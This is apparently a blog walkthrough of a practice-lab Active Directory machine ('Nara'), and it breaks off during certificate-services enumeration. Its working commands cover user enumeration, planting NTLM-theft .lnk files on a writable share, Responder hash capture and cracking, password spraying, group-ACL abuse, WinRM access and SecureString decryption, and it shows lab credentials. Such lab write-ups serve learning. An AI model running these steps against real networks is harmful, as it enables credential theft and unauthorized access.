Offensive Security Certified Professional (OSCP) exam this year.\n🪟 Life outside of infosec, the last 20% Outside of cybersecurity, I am also passionate about other things. I enjoy making good food, building positive relationships, watching anime, and listening to good music. I listen to music while doing almost all of my day-to-day activities, which helps me achieve total concentration. Additionally, I am currently pursuing a degree in Criminology and Security Studies (BSc) at an Open University to expand my knowledge in addressing real-world challenges. This program enhances my understanding of criminal behavior and law enforcement, providing a broader perspective on how to protect systems and data from various threats.\n✨ Future plans I plan to pursue in the field of Cloud Security and Penetration Testing. My goal, is never to be the best but to always keep learning, improving, and making a meaningful impact in the field of cybersecurity.\n“The only way to do great work is to love what you do.” – Steve Jobs\n","permalink":"http://localhost:1313/whoami/","summary":"❓ Introduction Hii, I am a 19 yr/old security researcher/penetration tester with extensive networking, scripting, linux administration, active directory and a little cloud experience. Familiarity with security frameworks including OWASP Top 10, Microsoft SDL, MITRE ATT\u0026amp;CK Framework and SANS Top 25. Knowledgeable on defensive security concepts including SIEM and threat hunting. Actively pursuing the OSCP certification and cloud security to further validate proficiency and skill set.\n💻 Infosec, or about 80% of my life My love for Infosec started six years ago.","title":"Whoami"},{"content":"Running an nmap scan we have :\n# Nmap 7.94SVN scan initiated Wed Aug 14 21:11:54 2024 as: nmap -p- -T4 -v --min-rate=1000 -sCV -oN nmap.txt -Pn 192.168.209.30 Increasing send delay for 192.168.209.30 from 0 to 5 due to 11 out of 21 dropped probes since last increase. Increasing send delay for 192.168.209.30 from 5 to 10 due to 11 out of 26 dropped probes since last increase. Nmap scan report for 192.168.209.30 Host is up (0.17s latency). Not shown: 65512 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-08-14 20:16:35Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: nara-security.com0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=Nara.nara-security.com | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:Nara.nara-security.com | Issuer: commonName=NARA-CA | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2024-08-02T01:56:04 | Not valid after: 2025-08-02T01:56:04 | MD5: fbf8:e851:dddb:efe3:c9f0:4605:1d4c:8878 |_SHA-1: bfc8:975f:6219:267f:4112:bff5:d130:6cb4:e0d1:6fea |_ssl-date: TLS randomness does not represent time 445/tcp open microsoft-ds? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: nara-security.com0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=Nara.nara-security.com | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:Nara.nara-security.com | Issuer: commonName=NARA-CA | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2024-08-02T01:56:04 | Not valid after: 2025-08-02T01:56:04 | MD5: fbf8:e851:dddb:efe3:c9f0:4605:1d4c:8878 |_SHA-1: bfc8:975f:6219:267f:4112:bff5:d130:6cb4:e0d1:6fea 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: nara-security.com0., Site: Default-First-Site-Name) |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=Nara.nara-security.com | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:Nara.nara-security.com | Issuer: commonName=NARA-CA | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2024-08-02T01:56:04 | Not valid after: 2025-08-02T01:56:04 | MD5: fbf8:e851:dddb:efe3:c9f0:4605:1d4c:8878 |_SHA-1: bfc8:975f:6219:267f:4112:bff5:d130:6cb4:e0d1:6fea 3269/tcp open globalcatLDAPssl? | ssl-cert: Subject: commonName=Nara.nara-security.com | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:Nara.nara-security.com | Issuer: commonName=NARA-CA | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2024-08-02T01:56:04 | Not valid after: 2025-08-02T01:56:04 | MD5: fbf8:e851:dddb:efe3:c9f0:4605:1d4c:8878 |_SHA-1: bfc8:975f:6219:267f:4112:bff5:d130:6cb4:e0d1:6fea 3389/tcp open ms-wbt-server Microsoft Terminal Services | ssl-cert: Subject: commonName=Nara.nara-security.com | Issuer: commonName=Nara.nara-security.com | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2024-05-06T12:45:53 | Not valid after: 2024-11-05T12:45:53 | MD5: 3653:d557:37ce:b6cc:64c8:ef5b:f664:bfaa |_SHA-1: 4641:1138:a700:92f6:64fd:8c8c:83b5:65e4:2f26:a24d |_ssl-date: 2024-08-14T20:18:59+00:00; 0s from scanner time. | rdp-ntlm-info: | Target_Name: NARASEC | NetBIOS_Domain_Name: NARASEC | NetBIOS_Computer_Name: NARA | DNS_Domain_Name: nara-security.com | DNS_Computer_Name: Nara.nara-security.com | DNS_Tree_Name: nara-security.com | Product_Version: 10.0.20348 |_ System_Time: 2024-08-14T20:17:45+00:00 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) | http-methods: |_ Supported Methods: GET 9389/tcp open mc-nmf .NET Message Framing 49664/tcp open unknown 49667/tcp open unknown 49668/tcp open msrpc Microsoft Windows RPC 49669/tcp open unknown 49685/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49687/tcp open unknown 49696/tcp open unknown 49698/tcp open unknown 49715/tcp open unknown 49725/tcp open unknown Service Info: Host: NARA; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required | smb2-time: | date: 2024-08-14T20:17:43 |_ start_date: N/A Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Aug 14 21:19:20 2024 -- 1 IP address (1 host up) scanned in 446.05 seconds We can see that this is an active directory machine with domain name as ; \u0026ldquo;nara-security.com\u0026rdquo; with DC/Hostname as ; \u0026quot;NARA\u0026quot;, It will be best adding this to your /etc/hosts file for domain resolution.\nWe can confirm this using netexec utility ❯ nxc smb 192.168.209.30 SMB 192.168.209.30 445 NARA [*] Windows Server 2022 Build 20348 x64 (name:NARA) (domain:nara-security.com) (signing:True) (SMBv1:False) SMB Enumeration ; There are literally no shares that a NULL user has access to except from the nara share ❯ smbclient -L \\\\\\\\192.168.209.30\\\\ Password for [WORKGROUP\\sec-fortress]: Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC nara Disk company share NETLOGON Disk Logon server share SYSVOL Disk Logon server share tstream_smbXcli_np_destructor: cli_close failed on pipe srvsvc. Error was NT_STATUS_IO_TIMEOUT Reconnecting with SMB1 for workgroup listing. do_connect: Connection to 192.168.209.30 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND) Unable to connect with SMB1 -- no workgroup available ========================================================================== ## In-accessible Shares ❯ smbclient \\\\\\\\192.168.209.30\\\\C$\\\\ Password for [WORKGROUP\\sec-fortress]: tree connect failed: NT_STATUS_ACCESS_DENIED ❯ smbclient \\\\\\\\192.168.209.30\\\\ADMIN$\\\\ Password for [WORKGROUP\\sec-fortress]: tree connect failed: NT_STATUS_ACCESS_DENIED ❯ smbclient \\\\\\\\192.168.209.30\\\\IPC$\\\\ Password for [WORKGROUP\\sec-fortress]: Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; dir NT_STATUS_NO_SUCH_FILE listing \\* smb: \\\u0026gt; put nmap.txt NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \\nmap.txt smb: \\\u0026gt; exit ❯ smbclient \\\\\\\\192.168.209.30\\\\NETLOGON\\\\ Password for [WORKGROUP\\sec-fortress]: Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; dir NT_STATUS_ACCESS_DENIED listing \\* smb: \\\u0026gt; exit ❯ smbclient \\\\\\\\192.168.209.30\\\\SYSVOL\\\\ Password for [WORKGROUP\\sec-fortress]: Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; dir NT_STATUS_ACCESS_DENIED listing \\* smb: \\\u0026gt; exit ## Accessible Shares ❯ smbclient \\\\\\\\192.168.209.30\\\\nara\\\\ Password for [WORKGROUP\\sec-fortress]: Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; dir . D 0 Sun Jul 30 15:31:58 2023 .. DHS 0 Wed Aug 14 20:53:15 2024 Documents D 0 Sun Jul 30 15:03:13 2023 Important.txt A 2200 Sun Jul 30 15:05:31 2023 IT D 0 Wed Aug 14 21:14:43 2024 7699711 blocks of size 4096. 3661536 blocks available smb: \\\u0026gt; So i downloaded the Important.txt file in this share using the mget command and the content can be viewed as shown below ❯ \\cat Important.txt Dear Team, We hope this message finds you well. We wanted to remind all employees to take a moment each day to check the shared documents folder diligently. As part of our commitment to streamline processes and enhance efficiency, important documents are frequently uploaded to this folder for your attention and action. The shared documents folder serves as a central hub for crucial updates, contracts, agreements, and various other essential materials requiring your attention. To ensure that you don\u0026#39;t miss any critical information, please make it a habit to access the folder at the beginning of your workday or as often as possible. Here are a few simple steps to stay up-to-date and ensure timely actions: * Access the Shared Documents Folder: Log in to your company account and navigate to the designated shared documents folder. If you encounter any issues accessing the folder, please reach out to the IT department for assistance. * Review New Additions: Look for any new documents that might have been uploaded since your last visit. These documents might require your signature, feedback, or acknowledgment. * Take Action Promptly: If there are documents that need your attention, please act promptly and follow the necessary procedures as indicated within each document. Whether it\u0026#39;s a signature, a comment, or any other form of response, timely actions are vital to keep our operations running smoothly. * Seek Clarification: If you encounter any uncertainty or have questions about the documents you find, don\u0026#39;t hesitate to reach out to the relevant department or the person mentioned in the document for clarification. It\u0026#39;s essential that you fully understand what\u0026#39;s required before proceeding. Remember, staying informed and acting promptly ensures that projects progress seamlessly, contracts get executed on time, and the company as a whole operates efficiently. Your cooperation in this matter is greatly appreciated and contributes to our collective success. Thank you for your attention to this matter, and if you have any concerns or suggestions to improve our document management process, please share them with your department head or the HR team. This text literally gave me the hint that we can actually place files in the nara share, You know what i am thinking ??\u0026hellip;\u0026hellip;\u0026hellip;.NTLM Theft 😈.\nFirst of all i tried to enumerate users using the RID brute technique since we have READ access on the “Remote IPC” share. ❯ cme smb 192.168.209.30 -u guest -p \u0026#34;\u0026#34; --rid-brute | grep -i sidtypeuser | awk -F\u0026#39;\\\u0026#39; \u0026#39;{print $2}\u0026#39; | cut -d \u0026#39;(\u0026#39; -f1 \u0026gt;\u0026gt; users.txt ❯ \\cat users.txt Administrator Guest krbtgt NARA$ Amelia.O\u0026#39;Brien Damian.Johnson Helen.Robinson Sara.O\u0026#39;Sullivan Jasmine.Roberts Declan.Reynolds Jodie.Summers Carolyn.Hill Jemma.Humphries Tracy.White Then as usual tried to try usernames as password, I mean leaving no stone un-turned, This is Offsec 😭🤲. ❯ cme smb 192.168.209.30 -u users.txt -p users.txt --no-bruteforce --continue-on-success SMB 192.168.209.30 445 NARA [*] Windows 10.0 Build 20348 x64 (name:NARA) (domain:nara-security.com) (signing:True) (SMBv1:False) SMB 192.168.209.30 445 NARA [-] nara-security.com\\Administrator:Administrator STATUS_LOGON_FAILURE SMB 192.168.209.30 445 NARA [-] nara-security.com\\Guest:Guest STATUS_LOGON_FAILURE SMB 192.168.209.30 445 NARA [-] nara-security.com\\krbtgt:krbtgt STATUS_LOGON_FAILURE SMB 192.168.209.30 445 NARA [-] nara-security.com\\NARA$:NARA$ STATUS_LOGON_FAILURE SMB 192.168.209.30 445 NARA [-] nara-security.com\\Amelia.O\u0026#39;Brien:Amelia.O\u0026#39;Brien STATUS_LOGON_FAILURE SMB 192.168.209.30 445 NARA [-] nara-security.com\\Damian.Johnson:Damian.Johnson STATUS_LOGON_FAILURE SMB 192.168.209.30 445 NARA [-] nara-security.com\\Helen.Robinson:Helen.Robinson STATUS_LOGON_FAILURE SMB 192.168.209.30 445 NARA [-] nara-security.com\\Sara.O\u0026#39;Sullivan:Sara.O\u0026#39;Sullivan STATUS_LOGON_FAILURE SMB 192.168.209.30 445 NARA [-] nara-security.com\\Jasmine.Roberts:Jasmine.Roberts STATUS_LOGON_FAILURE SMB 192.168.209.30 445 NARA [-] nara-security.com\\Declan.Reynolds:Declan.Reynolds STATUS_LOGON_FAILURE SMB 192.168.209.30 445 NARA [-] nara-security.com\\Jodie.Summers:Jodie.Summers STATUS_LOGON_FAILURE SMB 192.168.209.30 445 NARA [-] nara-security.com\\Carolyn.Hill:Carolyn.Hill STATUS_LOGON_FAILURE SMB 192.168.209.30 445 NARA [-] nara-security.com\\Jemma.Humphries:Jemma.Humphries STATUS_LOGON_FAILURE SMB 192.168.209.30 445 NARA [-] nara-security.com\\Tracy.White:Tracy.White STATUS_LOGON_FAILURE That didn\u0026rsquo;t turn out as expected so the next thing on my list is the ASREPRoasting attack which should be possible to get any user hash due to Kerberos pre-authentication required attribute enabled on an object. ❯ impacket-GetNPUsers nara-security.com/ -dc-ip 192.168.209.30 -usersfile users.txt -format hashcat -outputfile hashes.txt Impacket v0.12.0.dev1 - Copyright 2023 Fortra [-] User Administrator doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User Guest doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked) [-] User NARA$ doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User Amelia.O\u0026#39;Brien doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User Damian.Johnson doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User Helen.Robinson doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User Sara.O\u0026#39;Sullivan doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User Jasmine.Roberts doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User Declan.Reynolds doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User Jodie.Summers doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User Carolyn.Hill doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User Jemma.Humphries doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User Tracy.White doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set The last technique also didn\u0026rsquo;t yield result as expected so i decided to run my kerbrute and enumerate users again just to be sure i am on the right path. But hehe, No users where discovered except from the Administrator and Guest user account which is as usual. ❯ kerbrute userenum --dc 192.168.209.30 --domain nara-security.com /usr/share/wordlists/seclist/Usernames/xato-net-10-million-usernames.txt __ __ __ / /_____ _____/ /_ _______ __/ /____ / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\ / ,\u0026lt; / __/ / / /_/ / / / /_/ / /_/ __/ /_/|_|\\___/_/ /_.___/_/ \\__,_/\\__/\\___/ Version: v1.0.1 (385cb2b) - 08/14/24 - Ronnie Flathers @ropnop 2024/08/14 21:35:26 \u0026gt; Using KDC(s): 2024/08/14 21:35:26 \u0026gt; 192.168.209.30:88 2024/08/14 21:38:50 \u0026gt; [+] VALID USERNAME: guest@nara-security.com 2024/08/14 21:55:53 \u0026gt; [+] VALID USERNAME: administrator@nara-security.com 2024/08/14 23:13:00 \u0026gt; Done! Tested 8295455 usernames (2 valid) in 5854.516 seconds Moving on to the NTLM Theft technique i decided to use the ntlm_theft tool from Green Wolf to exploit this by generating a malicious .LNK file that will get executed by the automated user in that share and then return their hashes. ( That is if there is any, but let try :] ) ❯ python3 ntlm_theft.py -g all -s 192.168.45.235 -f test Created: test/test.scf (BROWSE TO FOLDER) Created: test/test-(url).url (BROWSE TO FOLDER) Created: test/test-(icon).url (BROWSE TO FOLDER) Created: test/test.lnk (BROWSE TO FOLDER) Created: test/test.rtf (OPEN) Created: test/test-(stylesheet).xml (OPEN) Created: test/test-(fulldocx).xml (OPEN) Created: test/test.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE) Created: test/test-(includepicture).docx (OPEN) Created: test/test-(remotetemplate).docx (OPEN) Created: test/test-(frameset).docx (OPEN) Created: test/test-(externalcell).xlsx (OPEN) Created: test/test.wax (OPEN) Created: test/test.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY) Created: test/test.asx (OPEN) Created: test/test.jnlp (OPEN) Created: test/test.application (DOWNLOAD AND OPEN) Created: test/test.pdf (OPEN AND ALLOW) Created: test/zoom-attack-instructions.txt (PASTE TO CHAT) Created: test/Autorun.inf (BROWSE TO FOLDER) Created: test/desktop.ini (BROWSE TO FOLDER) Generation Complete. After generating i uploaded the test.lnk file to each directory in the share cos i don\u0026rsquo;t know where the automation is taking place ☹️. ❯ smbclient \\\\\\\\192.168.165.30\\\\nara\\\\ Password for [WORKGROUP\\sec-fortress]: Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; put test.lnk putting file test.lnk as \\test.lnk (0.7 kb/s) (average 0.7 kb/s) smb: \\\u0026gt; cd IT smb: \\IT\\\u0026gt; put test.lnk putting file test.lnk as \\IT\\test.lnk (1.5 kb/s) (average 0.9 kb/s) smb: \\IT\\\u0026gt; cd ..\\ smb: \\\u0026gt; cd Documents\\ smb: \\Documents\\\u0026gt; put test.lnk putting file test.lnk as \\Documents\\test.lnk (4.3 kb/s) (average 1.3 kb/s) smb: \\Documents\\\u0026gt; Then started up responder and hell yeah i got user Tracy.White hash which we discovered earlier. ❯ sudo responder -I tun0 __ .----.-----.-----.-----.-----.-----.--| |.-----.----. | _| -__|__ --| _ | _ | | _ || -__| _| |__| |_____|_____| __|_____|__|__|_____||_____|__| |__| NBT-NS, LLMNR \u0026amp; MDNS Responder 3.1.4.0 To support this project: Github -\u0026gt; https://github.com/sponsors/lgandx Paypal -\u0026gt; https://paypal.me/PythonResponder Author: Laurent Gaffie (laurent.gaffie@gmail.com) To kill this script hit CTRL-C [+] Poisoners: LLMNR [ON] NBT-NS [ON] MDNS [ON] DNS [ON] --SNIP-- [+] Listening for events... [SMB] NTLMv2-SSP Client : 192.168.165.30 [SMB] NTLMv2-SSP Username : NARASEC\\Tracy.White [SMB] NTLMv2-SSP Hash : Tracy.White::NARASEC:9bbf8934331a4560:7E3E7EB81FF46C2022052D262FF86FED:0101000000000000804E1194E3EEDA012C0D0C83CBDD665900000000020008004F0031003400450001001E00570 049004E002D004300420041003200580050004B00420052005500300004003400570049004E002D004300420041003200580050004B0042005200550030002E004F003100340045002E004C004F00430041004C00030014004F00310034004 5002E004C004F00430041004C00050014004F003100340045002E004C004F00430041004C0007000800804E1194E3EEDA0106000400020000000800300030000000000000000100000000200000452F70F2B66A34630BD52340E899C3B9A07 2F2D5A53D205FCBB235EA806B7FB60A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003200330035000000000000000000 [*] Skipping previously captured hash for NARASEC\\Tracy.White [*] Skipping previously captured hash for NARASEC\\Tracy.White [*] Skipping previously captured hash for NARASEC\\Tracy.White [*] Skipping previously captured hash for NARASEC\\Tracy.White [*] Skipping previously captured hash for NARASEC\\Tracy.White [+] Exiting... [*] Skipping previously captured hash for NARASEC\\Tracy.White You can also use the Hashgrab tool by XCT to generate the .LNK file, haven\u0026rsquo;t tried it before but it is worth the try at least.\nEZPZ, Cracked this user hash and got the password with JtR ❯ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64]) Will run 4 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status zqwj041FGX (Tracy.White) 1g 0:00:00:01 DONE (2024-08-15 07:25) 0.7874g/s 1954Kp/s 1954Kc/s 1954KC/s zta729..zozorox92 Use the \u0026#34;--show --format=netntlmv2\u0026#34; options to display all of the cracked passwords reliably Session completed. The goal is to always password spray, I mean on a CTF not real world engagement 🤣🥹, and see if there are any other users using that same password. Unfortunately, Only the user Tracy.White which we have acquired uses that credential. ❯ cme smb 192.168.165.30 -u users.txt -p \u0026#34;zqwj041FGX\u0026#34; --continue-on-success SMB 192.168.165.30 445 NARA [*] Windows 10.0 Build 20348 x64 (name:NARA) (domain:nara-security.com) (signing:True) (SMBv1:False) SMB 192.168.165.30 445 NARA [-] nara-security.com\\Administrator:zqwj041FGX STATUS_LOGON_FAILURE SMB 192.168.165.30 445 NARA [-] nara-security.com\\Guest:zqwj041FGX STATUS_LOGON_FAILURE SMB 192.168.165.30 445 NARA [-] nara-security.com\\krbtgt:zqwj041FGX STATUS_LOGON_FAILURE SMB 192.168.165.30 445 NARA [-] nara-security.com\\NARA$:zqwj041FGX STATUS_LOGON_FAILURE SMB 192.168.165.30 445 NARA [-] nara-security.com\\Amelia.O\u0026#39;Brien:zqwj041FGX STATUS_LOGON_FAILURE SMB 192.168.165.30 445 NARA [-] nara-security.com\\Damian.Johnson:zqwj041FGX STATUS_LOGON_FAILURE SMB 192.168.165.30 445 NARA [-] nara-security.com\\Helen.Robinson:zqwj041FGX STATUS_LOGON_FAILURE SMB 192.168.165.30 445 NARA [-] nara-security.com\\Sara.O\u0026#39;Sullivan:zqwj041FGX STATUS_LOGON_FAILURE SMB 192.168.165.30 445 NARA [-] nara-security.com\\Jasmine.Roberts:zqwj041FGX STATUS_LOGON_FAILURE SMB 192.168.165.30 445 NARA [-] nara-security.com\\Declan.Reynolds:zqwj041FGX STATUS_LOGON_FAILURE SMB 192.168.165.30 445 NARA [-] nara-security.com\\Jodie.Summers:zqwj041FGX STATUS_LOGON_FAILURE SMB 192.168.165.30 445 NARA [-] nara-security.com\\Carolyn.Hill:zqwj041FGX STATUS_LOGON_FAILURE SMB 192.168.165.30 445 NARA [-] nara-security.com\\Jemma.Humphries:zqwj041FGX STATUS_LOGON_FAILURE SMB 192.168.165.30 445 NARA [+] nara-security.com\\Tracy.White:zqwj041FGX The rule of thumb for me is always to load up bloodhound once i have valid credentials. So i use the bloodhound-python tool which uses LDAP to query domain information if you have valid set of credentials. You don\u0026rsquo;t have to wait till you get foothold so you can run a SharpHound collector, Hell NO!!!!!!. ❯ bloodhound-python -u \u0026#39;Tracy.White\u0026#39; -p \u0026#39;zqwj041FGX\u0026#39; -ns 192.168.165.30 -d nara-security.com -c all --zip --dns-timeout 50 INFO: Found AD domain: nara-security.com INFO: Getting TGT for user WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (nara.nara-security.com:88)] [Errno -2] Name or service not known INFO: Connecting to LDAP server: nara.nara-security.com INFO: Found 1 domains INFO: Found 1 domains in the forest INFO: Found 1 computers INFO: Connecting to LDAP server: nara.nara-security.com INFO: Found 14 users INFO: Found 55 groups INFO: Found 2 gpos INFO: Found 3 ous INFO: Found 19 containers INFO: Found 0 trusts INFO: Starting computer enumeration with 10 workers INFO: Querying computer: Nara.nara-security.com INFO: Done in 02M 48S INFO: Compressing output into 20240815073121_bloodhound.zip Then uploaded the loot to bloodhound GUI and has shown below our user Tracy.White has GenericAll ACE to the \u0026ldquo;Remote Access\u0026rdquo; group. At least we would now be able to connect via WinRM or RDP by adding our self to this groups respectively. We can carry out this operation by doing so, using the net tool on kali to add our self to the group and checking if this operation was successful. # Add to group ❯ net rpc group addmem \u0026#34;REMOTE ACCESS\u0026#34; \u0026#34;Tracy.White\u0026#34; -U \u0026#34;nara-security.com\u0026#34;/\u0026#34;Tracy.White\u0026#34;%\u0026#34;zqwj041FGX\u0026#34; -S 192.168.165.30 # Confirm operation was successful ❯ net rpc group members \u0026#34;REMOTE ACCESS\u0026#34; -U \u0026#34;nara-security.com\u0026#34;/\u0026#34;Tracy.White\u0026#34;%\u0026#34;zqwj041FGX\u0026#34; -S 192.168.165.30 NARASEC\\Jodie.Summers NARASEC\\Tracy.White We can then try to authenticate via WinRM using CrackMapExec and see if we truly have access \u0026lt;#. Yes we do! ❯ cme winrm 192.168.165.30 -u Tracy.White -p zqwj041FGX SMB 192.168.165.30 5985 NARA [*] Windows 10.0 Build 20348 (name:NARA) (domain:nara-security.com) HTTP 192.168.165.30 5985 NARA [*] http://192.168.165.30:5985/wsman HTTP 192.168.165.30 5985 NARA [+] nara-security.com\\Tracy.White:zqwj041FGX (Pwn3d!) So go ahead and login using the evil-winrm utility as user Tracy.White which should be successful. ❯ evil-winrm -i 192.168.165.30 -u Tracy.White -p zqwj041FGX Evil-WinRM shell v3.5 --SNIP-- Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\tracy.white\\Documents\u0026gt; whoami narasec\\tracy.white Now we have to load Post-Exploitation tools like WinPEAS, Snaffler, LaZagne, MimiKatz etc to see what we have. However majority of this tools where blocked by AV so i started manual enumeration and found this automation.txt file. *Evil-WinRM* PS C:\\Users\\tracy.white\\Documents\u0026gt; dir Directory: C:\\Users\\tracy.white\\Documents Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 7/30/2023 8:05 AM 373 automation.txt The content looked like a powershell secure string which is used to help protect confidential text. *Evil-WinRM* PS C:\\Users\\tracy.white\\Documents\u0026gt; type automation.txt Enrollment Automation Account 01000000d08c9ddf0115d1118c7a00c04fc297eb0100000001e86ea0aa8c1e44ab231fbc46887c3a0000000002000000000003660000c000000010000000fc73b7bdae90b8b2526ada95774376ea0000000004800000a000000010000000b7a07aa1e5dc859485070026f64dc7a720000000b428e697d96a87698d170c47cd2fc676bdbd639d2503f9b8c46dfc3df4863a4314000000800204e38291e91f37bd84a3ddb0d6f97f9eea2b To decrypt this we can replicate the following steps *Evil-WinRM* PS C:\\Users\\tracy.white\\Documents\u0026gt; $user = \u0026#34;Enrollment Automation Account\u0026#34; # Not necessary a valid user if you don\u0026#39;t have one *Evil-WinRM* PS C:\\Users\\tracy.white\\Documents\u0026gt; $pass = \u0026#34;01000000d08c9ddf0115d1118c7a00c04fc297eb0100000001e86ea0aa8c1e44ab231fbc46887c3a0000000002000000000003660000c000000010000000fc73b7bdae90b8b2526ada95774376ea0000000004800000a000000010000000b7a07aa1e5dc859485070026f64dc7a720000000b428e697d96a87698d170c47cd2fc676bdbd639d2503f9b8c46dfc3df4863a4314000000800204e38291e91f37bd84a3ddb0d6f97f9eea2b\u0026#34; | ConvertTo-SecureString *Evil-WinRM* PS C:\\Users\\tracy.white\\Documents\u0026gt; $cred = New-Object System.Management.Automation.PSCredential($user, $pass) *Evil-WinRM* PS C:\\Users\\tracy.white\\Documents\u0026gt; $cred.GetNetworkCredential() | fl UserName : Enrollment Automation Account Password : hHO_S9gff7ehXw SecurePassword : System.Security.SecureString Domain : Now that we have the clear text password but don\u0026rsquo;t know which account uses this password, we can go ahead and password spray and as shown below we got a hit on user Jodie.Summers ❯ cme smb 192.168.220.30 -u users.txt -p hHO_S9gff7ehXw SMB 192.168.220.30 445 NARA [*] Windows 10.0 Build 20348 x64 (name:NARA) (domain:nara-security.com) (signing:True) (SMBv1:False) SMB 192.168.220.30 445 NARA [-] nara-security.com\\Administrator:hHO_S9gff7ehXw STATUS_LOGON_FAILURE SMB 192.168.220.30 445 NARA [-] nara-security.com\\Guest:hHO_S9gff7ehXw STATUS_LOGON_FAILURE SMB 192.168.220.30 445 NARA [-] nara-security.com\\krbtgt:hHO_S9gff7ehXw STATUS_LOGON_FAILURE SMB 192.168.220.30 445 NARA [-] nara-security.com\\NARA$:hHO_S9gff7ehXw STATUS_LOGON_FAILURE SMB 192.168.220.30 445 NARA [-] nara-security.com\\Amelia.O\u0026#39;Brien:hHO_S9gff7ehXw STATUS_LOGON_FAILURE SMB 192.168.220.30 445 NARA [-] nara-security.com\\Damian.Johnson:hHO_S9gff7ehXw STATUS_LOGON_FAILURE SMB 192.168.220.30 445 NARA [-] nara-security.com\\Helen.Robinson:hHO_S9gff7ehXw STATUS_LOGON_FAILURE SMB 192.168.220.30 445 NARA [-] nara-security.com\\Sara.O\u0026#39;Sullivan:hHO_S9gff7ehXw STATUS_LOGON_FAILURE SMB 192.168.220.30 445 NARA [-] nara-security.com\\Jasmine.Roberts:hHO_S9gff7ehXw STATUS_LOGON_FAILURE SMB 192.168.220.30 445 NARA [-] nara-security.com\\Declan.Reynolds:hHO_S9gff7ehXw STATUS_LOGON_FAILURE SMB 192.168.220.30 445 NARA [+] nara-security.com\\Jodie.Summers:hHO_S9gff7ehXw I don\u0026rsquo;t know what made me think about ADCS attacks but the \u0026ldquo;Enrollment Automation Account\u0026rdquo; already gave it away i think. so i decided to enumerate vulnerable certificates using the certipy tool. ❯ certipy find -vulnerable -dc-ip 192.168.220.30 -u \u0026#39;Jodie.Summers@nara-security.com\u0026#39; -p \u0026#39;hHO_S9gff7ehXw\u0026#39; Certipy v4.8.2 - by Oliver Lyak (ly4k) [*] Finding certificate templates [*] Found 34 certificate templates [*] Finding certificate authorities [*] Found 1 certificate authority [*] Found 12 enabled certificate templates [*] Trying to get CA configuration for \u0026#39;NARA-CA\u0026#39; via CSRA [!] Got error while trying to get CA configuration for \u0026#39;NARA-CA\u0026#39; via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error. [*] Trying to get CA configuration for \u0026#39;NARA-CA\u0026#39; via RRP [!] Failed to connect to remote registry. Service should be starting now. Trying again... [*] 